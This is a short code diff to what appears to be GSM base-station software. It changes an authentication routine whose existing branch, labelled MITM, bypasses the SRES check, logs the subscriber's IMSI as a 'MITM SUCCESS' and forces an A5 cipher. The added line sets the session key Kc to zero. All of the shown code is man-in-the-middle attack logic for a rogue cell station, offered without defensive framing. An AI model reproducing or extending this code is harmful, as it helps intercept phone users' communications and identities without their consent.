@@ -419,6 +419,7 @@ bool auth_local(AuthenticationParameters& authParams, GSM::LogicalChannel* LCH) 
     if (a3a8 == "UMTS") { // MITM - no need to actually check SRES, just pretend it's OK
 	LOG(DEBUG) << "MITM: SRES check bypassed for " << authParams.get_SRES();
 	cout << "\nMITM SUCCESS for " << IMSI << "\n";
+	authParams.set_Kc("0");
 	cipher(authParams, LCH);
 	LOG(DEBUG) << "MITM: a5/" << authParams.get_a5() << " cipher forced";
 	return true;
